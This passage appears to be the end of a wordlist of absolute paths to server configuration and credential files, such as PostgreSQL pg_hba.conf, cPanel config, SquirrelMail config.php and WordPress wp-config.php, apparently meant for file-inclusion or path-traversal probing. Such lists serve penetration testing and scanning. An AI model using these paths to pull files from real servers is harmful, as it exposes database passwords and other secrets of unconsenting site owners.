/usr/local/jakarta/tomcat/conf/workers.properties
/usr/local/lighttpd/conf/lighttpd.conf
/usr/local/lsws/conf/httpd_conf.xml
/usr/local/nginx/conf/nginx.conf
/usr/local/pgsql/data/pg_hba.conf
/usr/local/pgsql/data/postgresql.conf
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.php
/usr/local/psa/admin/conf/php.ini
/usr/local/psa/admin/conf/site_isolation_settings.ini
/usr/local/psa/admin/htdocs/domains/databases/phpMyAdmin/libraries/config.default.php
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/samba/lib/smb.conf.user
/usr/local/sb/config
/usr/pkg/etc/httpd/httpd.conf
/usr/pkg/etc/httpd/httpd-default.conf
/usr/pkg/etc/httpd/httpd-vhosts.conf
/usr/pkgsrc/net/pureftpd/pure-ftpd.conf
/usr/ports/contrib/pure-ftpd/pure-ftpd.conf
/usr/ports/ftp/pure-ftpd/pure-ftpd.conf
/usr/ports/net/pure-ftpd/pure-ftpd.conf
/usr/sbin/pure-config.pl
/usr/share/adduser/adduser.conf
/usr/share/squirrelmail/config/config.php
/usr/share/tomcat6/conf/context.xml
/usr/share/tomcat6/conf/logging.properties
/usr/share/tomcat6/conf/server.xml
/usr/share/tomcat6/conf/workers.properties
/var/cpanel/cpanel.config
/var/lib/pgsql/data/postgresql.conf
/var/local/www/conf/php.ini
/var/log/muddleftpd.conf
/var/nm2/postgresql.conf
/var/postgresql/db/postgresql.conf
/var/www/conf
/var/www/conf/httpd.conf
/var/www/html/squirrelmail/config/config.php
/var/www/html/wp-config.php
/var/www/html/wordpress/wp-config.php
/var/www/html/wp/wp-config.php
/var/www/squirrelmail/config/config.php
/web/conf/php.ini
/www/conf/httpd.conf
/Volumes/webBackup/private/etc/httpd/httpd.conf
/Volumes/webBackup/private/etc/httpd/httpd.conf.default
```